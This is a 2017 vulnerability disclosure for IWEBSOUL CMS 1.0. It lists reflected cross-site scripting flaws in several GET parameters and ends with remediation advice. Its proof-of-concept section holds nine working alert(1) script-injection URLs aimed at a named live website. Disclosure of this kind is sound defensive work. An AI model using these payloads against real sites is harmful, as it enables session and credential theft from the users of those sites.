=======

IWEBSOUL CMS - Multiple Cross Site Scripting Vulnerabilities 
 
Introduction:
==============

Intrepid Websoul Private Limited - iWebsoul is a rapidly growing IT Solution provider in India. 
They customize  solutions and tailor it according to the needs of our clients keeping in mind their vision and target audience.[iWbeSoul]
 
Vulnerability Disclosure:
==========================

2017-09-06: Public Disclosure
 
Affected Product(s):
=====================

IWEBSOUL CMS 1.0
 
Exploitation Technique:
========================

Remote
 
Severity Level:
================

High
 
Technical Details & Description:
=================================

A Cross Site Scripting vulnerability has been discovered in the IWEBSOUL CMS 1.0  web-application.
The vulnerability is located in the &#039;catid&#039;, &#039;scatid&#039;, &#039;spid&#039;,&#039;typeid&#039;, &#039;idnoo&#039; &&#039;bid&#039; parameters of the`product.php` action GET method request.
 
Request Method(s):

[+] GET
 
Vulnerable Function(s):

[+] product.php
 
Vulnerable Parameter(s):

[+] catid

[+] scatid

[+] spid

[+] typeid

[+] idnoo 

[+] bid

Other Cross Site Scripting  vulnerability is located in the &#039;type&#039; parameter of the`service-detail.php` action GET method request.

Request Method(s):

[+] GET
 
Vulnerable Function(s):

[+] service-detail.php
 
Vulnerable Parameter(s):

[+] type

More Cross Site Scripting vulnerability is located in the &#039;msg&#039; paramater of the &#039;register.php&#039; action GET method request.


Request Method(s):

[+] GET
 
Vulnerable Function(s):

[+] register.php
 
Vulnerable Parameter(s):

[+] msg

Other Cross Site Scripting vulnerability is located in the &#039;msg&#039; parameter of the &#039;sellerregistration.php&#039; action GET method request.


Request Method(s):

[+] GET
 
Vulnerable Function(s):

[+] sellerregistration.php
 
Vulnerable Parameter(s):

[+] msg

 

Proof of Concept (PoC):
========================

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. 
XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. 
An attacker can use XSS to send a malicious script to an unsuspecting user. 
The end useras browser has no way to know that the script should not be trusted, and will execute the script. 
Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. 
These scripts can even rewrite the content of the HTML page.[OWASP]
 
http://www.bumalow.com/product.php?catid=3999999"><script>alert(1)</script>

http://www.bumalow.com/product.php?scatid=3999999"><script>alert(1)</script>

http://www.bumalow.com/product.php?spid=3999999"><script>alert(1)</script>

http://www.bumalow.com/product.php?typeid=3999999"><script>alert(1)</script>

http://www.bumalow.com/product.php?bid=3999999"><script>alert(1)</script>

http://www.bumalow.com/product.php?bid=&catid=&idcot=&iddep=&idnoo=1"><script>alert(1)</script>

http://www.bumalow.com/service-detail.php?type=Painter"><script>alert(1)</script>

http://www.bumalow.com/register.php?msg=1"><script>alert(1)</script>

http://www.bumalow.com//sellerregistration.php?msg=1"><script>alert(1)</script>


Solution 
=========

Never enter untrusted data except in places defined for this purpose. 
The principle of this rule is to deny everything and mainly not to digest JavaScript code from an unknown source and then execute it.
Validate the escape characters before inserting them inside the HTML element. Failure to validate inputs may allow malicious code to be injected into the application.
Validate the parameters of the URL and verify information that it sends in HTTP requests, it escapes hexadecimal in URLs such as %25, where 25 is the ASCII code of the character "%".


